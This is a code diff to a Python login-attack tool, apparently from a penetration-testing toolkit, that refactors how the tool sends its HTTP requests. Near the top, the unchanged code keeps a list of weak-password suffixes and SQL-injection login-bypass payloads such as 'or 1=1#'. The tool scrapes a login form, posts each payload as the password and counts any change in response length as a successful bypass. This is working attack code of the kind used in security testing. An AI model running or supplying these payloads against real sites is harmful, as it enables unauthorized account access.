@@ -2,8 +2,7 @@
 # -*- coding:utf8 -*-
 #author:Jinhao
 
-import requests
-import os,re,sys,json
+import os
 from concurrent.futures import ThreadPoolExecutor
 from reports import reports
 from bs4 import BeautifulSoup
@@ -11,17 +10,14 @@ from bs4 import BeautifulSoup
 weak_dict = ['123', '888', '@123', '666']  # 常用弱密码后缀
 sql_pass = ['\'or 1=1#', '"or 1=1#', '\')or 1=1#', 'or 1=1--', 'a\'or\'1=1--', '\'OR 1=1%00']  # sql万能密码
 payload = weak_dict+sql_pass
-headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
-}
 
 class Login:
-    def __init__(self,url,file,threads,flag):
+    def __init__(self,url,REQ,file,threads,flag):
         self.url = url
+        self.REQ = REQ
         self.file = file
         self.threads = threads
         self.flag = flag
-        self.start()
 
     def start(self):
         exp = []
@@ -62,7 +58,7 @@ class Login:
         :return:dict
         '''
         args = {}
-        res = requests.get(self.url)
+        res = self.REQ.httpAccess(self.url)
         soup = BeautifulSoup(res.content, 'html.parser')
         xxx = soup.find_all('input')
         for i in xxx:
@@ -76,18 +72,12 @@ class Login:
         :param file:
         :return:
         '''
-        payload = []
         path = os.path.dirname(__file__)
         if file:
-            try:
-                F = open(file, 'r')
-                for x in F:
-                    payload.append(x.replace('\n', ''))
-                return payload
-            except:
-                return
+            return file
 
         else:
+            payload = []
             file = 'password.txt'
             filepath = "{0}/{1}/{2}".format(path, r'../dict/login', file)
             F = open(filepath, 'r')
@@ -109,10 +99,10 @@ class Login:
         pwd = list(data)[1]
         p_v = data[pwd]
         try:
-            self.len = len(requests.post(self.url,data=data,headers=headers,timeout=5).content)   # 设置默认网站长度
+            self.len = len(self.REQ.autoPostAccess(self.url,data=data).content)   # 设置默认网站长度
         except:
-            self.len = len(requests.post(self.url, data=data, headers=headers,
-                                         timeout=20).content)  # 设置默认网站长度
+            raise('获取网站长度失败')
+
         for x in payloads:
             data[pwd] = p_v + x    # 仅仅修改密码部分
             exp.append(data)
@@ -159,7 +149,7 @@ class Login:
         :return:
         '''
         try:
-            res = requests.post(self.url,data=data,headers=headers,timeout=5).content
+            res = self.REQ.autoPostAccess(self.url,data=data).content
             length = len(res)
             if length != self.len:
                 msg = {'flag':1,'msg':data,'len':length}
